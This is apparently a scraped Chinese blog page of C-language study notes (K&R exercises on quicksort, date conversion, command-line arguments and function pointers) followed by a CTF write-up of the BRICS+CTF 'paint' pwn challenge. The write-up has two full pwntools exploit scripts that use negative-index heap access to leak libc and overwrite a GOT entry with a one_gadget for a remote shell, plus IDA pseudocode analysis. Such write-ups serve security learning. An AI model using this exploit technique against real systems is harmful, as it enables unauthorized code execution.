swap(v,left,(left+right)/2);    last = left;    for(i = left+1; i&lt;= right; i++)        if (strcmp(v[i],v[left]) &lt; 0 )            swap(v,++last,i);    swap(v,left,last);    qsort(v,left,last-1);    qsort(v,last+1,right);&#125;void swap(char *v[],int i,int j)&#123;    char *temp;    temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;



åŸºç¡€å¿«é€Ÿæ’åº123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;void swap(int v[],int i,int j);void qsort(int v[],int left,int right);void main()&#123;    int i;    int v[11] = &#123;3,2,9,2,3,7,8,1,6,8,4&#125;;    qsort(v,0,10);    for(i=0;i&lt;11;i++)        printf(&quot;%d,&quot;,v[i]);&#125;void swap(int v[],int i,int j)&#123;    int temp;        temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;// 3,2,9,2,3,7,8,1,6,8,4// ä»¥é€’å¢é¡ºåºå¯¹v[left]åˆ°v[right]è¿›è¡Œæ’åºvoid qsort(int v[],int left,int right)&#123;    int i,last;    void swap(int v[],int i,int j);        if (left &gt;= right) return;    swap(v,left, (left+right)/2);    last = left;    for (i = left+1;i&lt;=right;i++)        if (v[i] &lt; v[left])            swap(v,++last,i);    swap(v,left,last);    //qsort(v, left, last-1);    //qsort(v,last+1,right);&#125;ä¸¾ä¾‹	3,2,9,2,3,7,8,1,6,8,4    qsort(v,0,10)ç¬¬ä¸€æ¬¡æ’åºå    4,2,2,3,3,1,6,7,8,8,9ç¬¬ä¸€æ¬¡æŠŠä¸­é—´çš„7æ”¾åˆ°å¼€å¤´,ç„¶åå¯¹æ¯”,ä¾æ¬¡æŠŠå°äºå®ƒçš„å¾€å‰æ”¾,æ”¾åˆ°last+1çš„ä½ç½®    7,2,9,2,3,3,8,1,6,8,4    7,2,2,9,3,3,8,1,6,8,4    7,2,2,3,9,3,8,1,6,8,4    7,2,2,3,3,9,8,1,6,8,4    7,2,2,3,3,1,8,9,6,8,4    7,2,2,3,3,1,6,9,8,8,4    7,2,2,3,3,1,6,4,8,8,9 //æ­¤æ—¶laståœ¨4è¿™ä¸ªä½ç½®,è‚¯å®šä¹Ÿæ˜¯æ¯”å®ƒå°çš„,è€Œä¸”æ˜¯æœ€åä¸€ä¸ª,æ­¤æ—¶å†swapå°±å¯ä»¥äº†



å¤šç»´æ•°ç»„12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;int day_of_year(int year, int month,int day);void month_day(int year,int yearday,int *pmonth,int *pday);void main()&#123;    int choice;    int year,month,day;    int dayofyear;    int dayofmonth;    printf(&quot;è¯·è¾“å…¥é€‰é¡¹\n1.å°†æŸå¹´æŸæœˆæŸæ—¥çš„æ—¥æœŸè¡¨ç¤ºå½¢å¼è½¬æ¢æˆæŸå¹´ç¬¬å‡ å¤©çš„å½¢å¼\n2.å°†æŸå¹´ä¸­ç¬¬å‡ å¤©çš„æ—¥æœŸè¡¨ç¤ºå½¢å¼è½¬æ¢ä¸ºæŸæœˆæŸæ—¥\n&quot;);    scanf(&quot;%d&quot;,&amp;choice);    switch(choice)&#123;        case 1:            printf(&quot;è¯·è¾“å…¥å¹´æœˆæ—¥,ç©ºæ ¼éš”å¼€\n&quot;);            scanf(&quot;%d %d %d&quot;,&amp;year,&amp;month,&amp;day);            dayofyear = day_of_year(year,month,day);            printf(&quot;%då¹´%dæœˆ%dæ—¥æ˜¯%då¹´ç¬¬%då¤©\n&quot;,year,month,day,year,dayofyear);            break;        case 2:            printf(&quot;è¯·è¾“å…¥å¹´ä»½å’Œå¤©æ•°,ç©ºæ ¼éš”å¼€\n&quot;);            scanf(&quot;%d %d&quot;,&amp;year,&amp;day);            month_day(year,day,&amp;month,&amp;dayofmonth);            printf(&quot;%då¹´ç¬¬%då¤©æ˜¯%då¹´%dæœˆ%då·&quot;,year,day,year,month,dayofmonth);            break;    &#125;&#125;static char daytab[2][13]=&#123;    &#123;0,31,28,31,30,31,30,31,31,30,31,30,31&#125;,    &#123;0,31,29,31,30,31,30,31,31,30,31,30,31&#125;&#125;;//å°†æŸå¹´æŸæœˆæŸæ—¥çš„æ—¥æœŸè¡¨ç¤ºå½¢å¼è½¬æ¢æˆæŸå¹´ç¬¬å‡ å¤©çš„å½¢å¼int day_of_year(int year, int month,int day)&#123;    int i,leap;        leap = year%4 == 0 &amp;&amp; year%100 !=0 || year % 400 ==0;    for(i=1;i&lt; month;i++)        day+= daytab[leap][i];    return day;&#125;//å°†æŸå¹´ä¸­ç¬¬å‡ å¤©çš„æ—¥æœŸè¡¨ç¤ºå½¢å¼è½¬æ¢ä¸ºæŸæœˆæŸæ—¥void month_day(int year,int yearday,int *pmonth,int *pday)&#123;    int i,leap;        leap = year%4 == 0 &amp;&amp; year%100 !=0 || year % 400 ==0;    for (i=1;yearday &gt; daytab[leap][i];i++)        yearday -= daytab[leap][i];    *pmonth = i;    *pday = yearday;&#125;







å‘½ä»¤è¡Œå‚æ•° echoç¬¬ä¸€ä¸ªç‰ˆæœ¬å°†argvçœ‹æˆä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆæ•°ç»„
1234567891011#include &lt;stdio.h&gt;int main(int argc,char *argv[])&#123;    int i;        for (i=0; i&lt;argc; i++)        printf(&quot;%s%s&quot;,argv[i],(i &lt; argc-1) ? &quot; &quot;: &quot;&quot;);    printf(&quot;\n&quot;);    return 0;&#125;



å› ä¸ºargvæ˜¯ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆæ•°ç»„çš„æŒ‡é’ˆ,æ‰€ä»¥,å¯ä»¥é€šè¿‡æŒ‡é’ˆè€Œéæ•°ç»„ä¸‹æ ‡çš„æ–¹å¼å¤„ç†å‘½ä»¤è¡Œå‚æ•°.
ç¬¬äºŒä¸ªç‰ˆæœ¬æ˜¯åœ¨å¯¹argvè¿›è¡Œè‡ªå¢è¿ç®—ã€å¯¹argcè¿›è¡Œè‡ªå‡è¿ç®—çš„åŸºç¡€ä¸Šå®ç°çš„(argvæ˜¯ä¸€ä¸ªæŒ‡å‘charç±»å‹çš„æŒ‡é’ˆçš„æŒ‡é’ˆ)
123456789#include &lt;stdio.h&gt;int main(int argc,char *argv[])&#123;    while( --argc &gt; 0)        printf(&quot;%s%s&quot;,*++argv,(argc &gt; 1)? &quot; &quot;:&quot;&quot;);    printf(&quot;\n&quot;);    return 0;&#125;

æ¨¡å¼æŸ¥æ‰¾ç¨‹åº4.1èŠ‚  å†…ç½®äº†æŸ¥æ‰¾æ¨¡å¼
â€‹		å°†è¾“å…¥ä¸­åŒ…å«ç‰¹å®šâ€œæ¨¡å¼â€æˆ–å­—ç¬¦ä¸²çš„å„è¡Œæ‰“å°å‡ºæ¥(grepçš„ç‰¹ä¾‹ç›¸å½“äº)
12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#define MAXLINE 1000int getline1(char line[],int max);int strindex(char source[],char searchfor[]);    char pattern[] = &quot;tang&quot;;    int main()&#123;    char line[MAXLINE];    int found = 0;    while (getline1(line,MAXLINE) &gt; 0 )        if(strindex(line,pattern) &gt;= 0 )&#123;            printf(&quot;%s&quot;,line);            found++;        &#125;    return found;&#125;//å°†è¡Œä¿å­˜åˆ°sä¸­,å¹¶è¿”å›è¯¥è¡Œçš„é•¿åº¦int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;// è¿”å›tåœ¨sä¸­çš„ä½ç½®,å¦‚æœæ²¡æ‰¾åˆ°è¿”å›-1int strindex(char s[],char t[])&#123;    int i,j,k;        for (i=0; s[i] !=&#x27;\0&#x27;;i++)&#123;        for(j = i,k=0; t[k]!=&#x27;\0&#x27; &amp;&amp; s[j]==t[k];j++,k++)            ;        if (k &gt; 0 &amp;&amp; t[k] == &#x27;\0&#x27;)            return i;    &#125;    return -1;&#125;



5.10 å¢å¼ºç‰ˆ å®ç°findåŠŸèƒ½,æ‰“å°ä¸ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„æ¨¡å¼åŒ¹é…çš„è¡Œ
1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINE 1000int getline1(char *line, int max);//int main(int argc,char *argv[])&#123;    char line[MAXLINE];    int found = 0;    if (argc !=2 )        printf(&quot;Usage: find pattern\n&quot;);    else        while(getline1(line,MAXLINE) &gt; 0)            if (strstr(line,argv[1]) != NULL)&#123;                printf(&quot;%s&quot;,line);                found++;            &#125;    return found;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;



å†æ¬¡æ”¹è¿›
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINE 1000int getline1(char *line, int max);//int main(int argc,char *argv[])&#123;    char line[MAXLINE];    long lineno = 0;    int c,except = 0, number = 0, found =0;        while(--argc &gt; 0 &amp;&amp; (*++argv)[0] == &#x27;-&#x27;)        while(c = *++argv[0])   //è¿™é‡Œçš„++...........æ˜¯é‚£ä¸ªæ„æ€?            switch(c)&#123;                case &#x27;x&#x27;:                    except = 1;                    break;                case &#x27;n&#x27;:                    number = 1;                    break;                default:                    printf(&quot;find: illegal option %c\n&quot;,c);                    argc = 0;                    found = -1;                    break;                   &#125;        if (argc !=1 )        printf(&quot;Usage: find -x -n pattern\n&quot;);    else        while(getline1(line,MAXLINE) &gt; 0)&#123;         	lineno++;               if ((strstr(line,*argv) != NULL)!= except)&#123;                if(number)                    printf(&quot;%ld:&quot;,lineno);                printf(&quot;%s&quot;,line);                found++;            &#125;        &#125;    return found;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;



å‡½æ•°æŒ‡é’ˆ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ALLOCSIZE 10000#define MAXLINES 5000#define MAXLEN 1000char *lineptr[MAXLINES];int readlines(char *lineptr[],int maxlines);void writelines(char *lineptr[],int nlines);void qsort1(void *v[], int left,int right,int (*comp)(void *,void *));int numcmp(char *,char *);int getline1(char *line, int max);char *alloc(int n);//å¯¹è¾“å…¥çš„æ–‡æœ¬è¿›è¡Œæ’åºint main(int argc,char *argv[])&#123;    int nlines; //è¯»å…¥çš„è¾“å…¥è¡Œæ•°    int numeric = 0; //è‹¥è¿›è¡Œæ•°å€¼æ’åº,åˆ™ numbericçš„å€¼ä¸º1        if(argc &gt; 1 &amp;&amp; strcmp(argv[1],&quot;-n&quot;) == 0)        numeric = 1;    if ((nlines = readlines(lineptr,MAXLINES)) &gt;= 0)&#123;        qsort1((void **)lineptr, 0, nlines -1, (int (*)(void*,void*))(numeric ? numcmp:strcmp));        writelines(lineptr, nlines);        return 0;    &#125;else&#123;        printf(&quot;input too big to sort\n&quot;);        return 1;    &#125;    &#125;int readlines(char *lineptr[],int maxlines)&#123;    int len, nlines;    char *p,line[MAXLEN];    nlines = 0;    while((len = getline1(line,MAXLEN)) &gt; 0 )    &#123;        if (nlines &gt; maxlines || (p = alloc(len)) == NULL)            return -1;        else&#123;            line[len-1] = &#x27;\0&#x27;;//åˆ é™¤æ¢è¡Œç¬¦            strcpy(p,line);            lineptr[nlines++] = p;        &#125;    &#125;    return nlines;&#125;void writelines(char *lineptr[],int nlines)&#123;    int i;    for(i = 0;i&lt;nlines;i++)        printf(&quot;%s\n&quot;,lineptr[i]);&#125;void qsort1(void *v[], int left,int right,int (*comp)(void *,void *))&#123;    int i,last;    void swap(void *v[],int i, int j);    if (left &gt;= right)        return;    swap(v,left,(left+right)/2);    last = left;    for(i = left+1; i&lt;= right; i++)        if ((*comp)(v[i],v[left]) &lt; 0 )            swap(v,++last,i);    swap(v,left,last);    qsort1(v,left,last-1,comp);    qsort1(v,last+1,right,comp);&#125;int numcmp(char *s1, char *s2)&#123;    double v1,v2;        v1 = atof(s1);    v2 = atof(s2);    if (v1&lt;v2)        return -1;    else if (v1 &gt; v2)        return 1;    else        return 0;&#125;void swap(void *v[],int i,int j)&#123;    char *temp;    temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;static char allocbuf[ALLOCSIZE];static char *allocp = allocbuf;char *alloc(int n)&#123;    if (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; //æœ‰è¶³å¤Ÿçš„ç©ºé—²ç©ºé—´        allocp += n;        return allocp - n; //åˆ†é…å‰çš„æŒ‡é’ˆp    &#125;else&#123;        return 0;    &#125;    &#125;



(void **)æ˜¯å•¥, å°†æŒ‡é’ˆæ•°ç»„è½¬æ¢æˆ æŒ‡å‘æŒ‡é’ˆæ•°ç»„çš„æŒ‡é’ˆç±»å‹
å¤æ‚å£°æ˜ç¨‹åºdclæ˜¯å•¥
1234char **argv    argv: pointer to pointer to charint (*daytab)[13]    daytab: pointer to array[13] of int





qèƒ½ä¸èƒ½ç”¨gdbæ˜¾ç¤ºå˜é‡ä¿¡æ¯å‘¢,ç»“æ„ä¿¡æ¯ç­‰,æ¯”å¦‚charå’Œintçš„åŒºåˆ«
EOFçš„è¯,åŒ…æ‹¬å“ªäº›
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/" title="pwnå…¥é—¨-42-BRICS+CTF-æ•´æ•°æº¢å‡ºä¸€é¢˜">pwnå…¥é—¨-42-BRICS+CTF-æ•´æ•°æº¢å‡ºä¸€é¢˜</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-28T09:27:01.000Z" title="å‘è¡¨äº 2023-09-28 17:27:01">2023-09-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-10-06T06:17:50.515Z" title="æ›´æ–°äº 2023-10-06 14:17:50">2023-10-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">é¢˜ç›®:paint    é™„ä»¶: æœ¬é“¾æ¥åœ°å€+ paint.zip
dockerfileä½¿ç”¨æ‰§è¡Œå‘½ä»¤è¿›è¡Œæ„å»º
[root@docker Dockerfile]#docker build -t ctfpwn .ä¸Šæ¡å‘½ä»¤ä¸­buildä¸ºæ„å»ºé•œåƒï¼Œè€Œå‚æ•°tåˆ™æŒ‡å®šé•œåƒnameï¼Œ.åˆ™ä¸ºDockerfileçš„è·¯å¾„
è¿›å»åæ‰¾libc
123456789101112root@ff854125b9c3:/# chmod +x /lib/x86_64-linux-gnu/libc.so.6root@ff854125b9c3:/# /lib/x86_64-linux-gnu/libc.so.6GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.Copyright (C) 2022 Free Software Foundation, Inc.This is free software; see the source for copying conditions.There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR APARTICULAR PURPOSE.Compiled by GNU CC version 11.2.0.libc ABIs: UNIQUE IFUNC ABSOLUTEFor bug reporting instructions, please see:&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.



åé¢å¯ä»¥ä¸Šè„šæœ¬æ­å»ºç¯å¢ƒè°ƒè¯•, å‡†å¤‡å¥½è‡ªå·±é‚£ä¸ªè„šæœ¬
glibc-allinoneçš„æºæœ‰æ—¶å€™ä¸è¡Œï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæœ‰çš„
https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/
æ€è·¯ç”»å¸ƒç»“æ„123456789101112131415161718                    +---------+----------+--------------------+                    |                    |                    |                    |                    |    chunk head      |                    |                    |                    |                    +---------+----------+-----------------+--+canvas[idx] -&gt;      +---------+----------+--------------------+                    |                    |                    |                    |          v3   v2   | v0+8 malloc canvas |                    |                    |                    |                    +---------+----------+-----------------+--+canvas[idx] + 16 -&gt; +---------+----------+--------------------+                    |                    |                    |                    |      rate          |    comment addr    |                    |                    |                    |                    +---------+----------+-----------------+--+         



æ³„æ¼libcåœ°å€â€‹		æ•°å­—ä¸ä¸€å®šæ˜¯æ­£çš„,å¯ä»¥è¾“å…¥è´Ÿçš„!!!  æ³¨æ„å­¦ä¹ è¿™ç§æ¼æ´æ€ç»´, å¯ä»¥çœ‹åˆ°canvaså‰é¢æœ‰libcçš„å‡½æ•°,å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ³„æ¼åœ°å€

ä¿®æ”¹gotè¡¨æŒ‡é’ˆä¸ºonegadgetâ€‹		å…¶å®æœ¬è´¨å°±æ˜¯åˆ©ç”¨è´Ÿæ•°æº¢å‡ºï¼Œè®©æ“ä½œä»¥ä¸ºæ˜¯åœ¨æ“ä½œå †å—ï¼Œæ‰¾åˆ°å¯¹åº”çš„ä½ç½®è¿›è¡Œæ“ä½œå³å¯ï¼Œ
â€‹		rate(-8,0x222,â€™\x08\x01â€™*4+p64(addr))   
â€‹		è¿™é‡Œçš„è¯,ä¼šæŠŠ-8è¿™ä¸ªä½ç½®å½“æˆç”»å¸ƒç»“æ„æ•°æ®åŒºå¼€å¤´, ç¬¬ä¸€ä¸ªåœˆèµ·æ¥çš„ä½ç½®åˆ™æ˜¯å­˜æ”¾comment chunk åœ°å€çš„,ç„¶åå†ç»™commentèµ‹å€¼â€™\x08\x01â€™*4+p64(addr)

â€‹		draw(-5,p64(one))   -5æ˜¯çº¢è‰²ä½ç½®,è¿™é‡ŒåˆæŠŠ-5å¼€å§‹çš„ä½ç½®å½“æˆäº†ç”»å¸ƒç»“æ„çš„æ•°æ®åŒºå¼€å¤´ åœ¨drawå‡½æ•°é‡Œå°±æ˜¯canvas[idx],è¿™æ˜¯ç”»å¸ƒçš„ä¸Šå±‚ç»“æ„,è€Œç”»å¸ƒå†…å®¹çš„å­˜å‚¨ä½ç½®æ˜¯è“è‰²çš„, è¿™é‡Œå°±å¯ä»¥å¯¹è“è‰²æŒ‡å‘çš„åœ°å€è¿›è¡Œä¿®æ”¹äº†,ä¹Ÿå°±æ˜¯gotè¡¨




â€‹		å¾€ç”»å¸ƒé‡Œ,ä¹Ÿå°±æ˜¯gotè¡¨è¿›è¡Œä¿®æ”¹, æ”¹æˆonegadget




â€‹		(è¿™é‡Œåœ°å€ä¸å¯¹,ä¸æ˜¯åŒä¸€æ¬¡è°ƒè¯•çš„,gdbé‡Œæœ‰pie),ä½†æ˜¯åŸç†ä¸€æ ·,readå,æŠŠgotè¡¨æ”¹æˆäº†onegadget

exppython2ç‰ˆæœ¬
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import*context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level=True#elf=ELF(&#x27;pwn&#x27;)libc=ELF(&#x27;libc.so.6&#x27;)#p=process(&#x27;./vuln&#x27;)#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)p=remote(&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;,13003)def add(id,wid,hei):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;1&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter canvas width (1-255): &#x27;)	p.sendline(str(wid))	p.recvuntil(&#x27;Enter canvas height (1-255): &#x27;)	p.sendline(str(hei))def resize(id,wid,hei):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;2&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter new width (1-255): &#x27;)	p.sendline(str(wid))	p.recvuntil(&#x27;Enter new height (1-255): &#x27;)	p.send(str(hei))def draw(id,data):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;3&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;` chars in `height` lines):&#x27;)	#for i in range(wid):		p.send(str(data))def delete(id):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;6&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))def show(id):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;4&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))def comment(id,x,rate):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;5&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter rate: &#x27;)	p.sendline(str(x))	p.recvuntil(&#x27;ment (y/n): &#x27;)	p.sendline(&#x27;y&#x27;)	p.recvuntil(&#x27;r your comment: &#x27;)	p.sendline(str(rate))	#æ³„æ¼åœ°å€show(-2)p.recv(0xf)leak=u64(p.recv(8))-0x1300libcbase=leak-(0x7ffff7fad780-0x00007ffff7d93000)print hex(leak)print hex(libcbase)addr=libcbase+0x219098edit(-8,0x222,&#x27;\x08\x01&#x27;*4+p64(addr))#system=libcbase+libc.sym[&#x27;/bin/sh\x00&#x27;]one=libcbase+0xebcf8drow(-5,p64(one))p.interactive()





ä¸Šè¿°æ˜¯ä¿®æ”¹è¿‡çš„,ä¸‹é¢æ˜¯é˜Ÿå‹åŸexp
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import*context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level=True#elf=ELF(&#x27;pwn&#x27;)libc=ELF(&#x27;libc.so.6&#x27;)#p=process(&#x27;./vuln&#x27;)#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)p=remote(&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;,13003)def add(id,wid,hei):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;1&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter canvas width (1-255): &#x27;)	p.sendline(str(wid))	p.recvuntil(&#x27;Enter canvas height (1-255): &#x27;)	p.sendline(str(hei))def re(id,wid,hei):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;2&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter new width (1-255): &#x27;)	p.sendline(str(wid))	p.recvuntil(&#x27;Enter new height (1-255): &#x27;)	p.send(str(hei))def drow(id,data):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;3&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;` chars in `height` lines):&#x27;)	#for i in range(wid):		p.send(str(data))def delete(id):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;6&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))def show(id):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;4&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))def edit(id,x,rate):	p.recvuntil(&#x27;&gt; &#x27;)	p.sendline(&#x27;5&#x27;)	p.recvuntil(&#x27;Enter idx: &#x27;)	p.sendline(str(id))	p.recvuntil(&#x27;Enter rate: &#x27;)	p.sendline(str(x))	p.recvuntil(&#x27;ment (y/n): &#x27;)	p.sendline(&#x27;y&#x27;)	p.recvuntil(&#x27;r your comment: &#x27;)	p.sendline(str(rate))	add(0,8,1)#edit(0,0x20,&#x27;a&#x27;*0x10)#re(0,0x21,0x20)#show(-8)##add(1,1,0xf)show(-2)p.recv(0xf)leak=u64(p.recv(8))-0x1300libcbase=leak-(0x7ffff7fad780-0x00007ffff7d93000)print hex(leak)print hex(libcbase)#attach(p,&#x27;b *0x00005555555557a3&#x27;)pause()#delete(0)#add(0,0xf0,0xf0)addr=libcbase+0x219098edit(-8,0x222,&#x27;\x08\x01&#x27;*4+p64(addr))#system=libcbase+libc.sym[&#x27;/bin/sh\x00&#x27;]one=libcbase+0xebcf8drow(-5,p64(one))p.interactive()

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/" title="pwnå…¥é—¨-41-å¸¸è§çš„æŒ‡é’ˆè¯†åˆ«">pwnå…¥é—¨-41-å¸¸è§çš„æŒ‡é’ˆè¯†åˆ«</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-28T09:26:19.000Z" title="å‘è¡¨äº 2023-09-28 17:26:19">2023-09-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-16T13:14:03.168Z" title="æ›´æ–°äº 2023-11-16 21:14:03">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">â€‹	åœ¨åšé¢˜çš„æ—¶å€™, idaä¸­å¾ˆå¤šæŒ‡é’ˆçœ‹ä¸æ‡‚,å°±å¾ˆå°´å°¬,éœ€è¦å†å¥½å¥½å­¦ä¹ ä¸‹, ä¸è¿‡è¿˜æ˜¯å¤šç§¯ç´¯,é‡åˆ°é¢˜ç›®çš„æ—¶å€™æ¯æ¬¡éƒ½è¿›è¡Œåˆ†æ,åé¢å°±éƒ½æ…¢æ…¢ç†Ÿæ‚‰äº†,(ç›¸åº”çš„å¯ä»¥æ ¹æ®åæ±‡ç¼–ä»£ç å†™æºä»£ç ,ä»å¼€å‘ã€æ­£å‘çš„è§’åº¦æ¥çœ‹)
ä»¥ä¸€é“é¢˜ç›®ä¸ºä¾‹å­,å­¦ä¹ ä¸‹æŒ‡é’ˆç­‰1234567891011121314151617181920212223242526272829303132333435363738394041424344unsigned __int64 add_canvas()&#123;  __int64 v0; // rbx  int v2; // [rsp+Ch] [rbp-24h] BYREF  int v3; // [rsp+10h] [rbp-20h] BYREF  int idx; // [rsp+14h] [rbp-1Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  v5 = __readfsqword(0x28u);  idx = read_idx();  if ( canvas[idx] )  &#123;    puts(&quot;Invalid index&quot;);  &#125;  else  &#123;    canvas[idx] = malloc(0x20uLL);     v2 = 0;    v3 = 0;    printf(&quot;Enter canvas width (1-255): &quot;);    __isoc99_scanf(&quot;%hhd&quot;, &amp;v2);    printf(&quot;Enter canvas height (1-255): &quot;);    __isoc99_scanf(&quot;%hhd&quot;, &amp;v3);    if ( (unsigned int)(v2 * v3) &lt;= 0xFF )    &#123;      v0 = canvas[idx]; //v0è·å–canvasç”»å¸ƒçš„å †å—çš„åœ°å€,      *(_QWORD *)(v0 + 8) = malloc((unsigned int)(v2 * v3 + 1));        //v0+8,ç„¶åå¼ºåˆ¶ç±»å‹è½¬æ¢,å†è§£å¼•ç”¨,        //_QWORD 64ä½    word      *(_BYTE *)canvas[idx] = v2; // canvasè¿™é‡Œä¹Ÿæ˜¯QWORDç±»å‹(å…¶å®å¯ä»¥ç»Ÿä¸€æ›¿æ¢æˆv0çš„      *(_BYTE *)(canvas[idx] + 1LL) = v3;// æ‰€ä»¥+1 æ˜¯+1 byte      *(_DWORD *)(canvas[idx] + 16LL) = 0;      *(_QWORD *)(canvas[idx] + 24LL) = 0LL;      puts(&quot;Done&quot;);    &#125;    else    &#123;      puts(&quot;Too big&quot;);      free((void *)canvas[idx]);      canvas[idx] = 0LL;    &#125;  &#125;  return v5 - __readfsqword(0x28u);&#125;



chatgpt
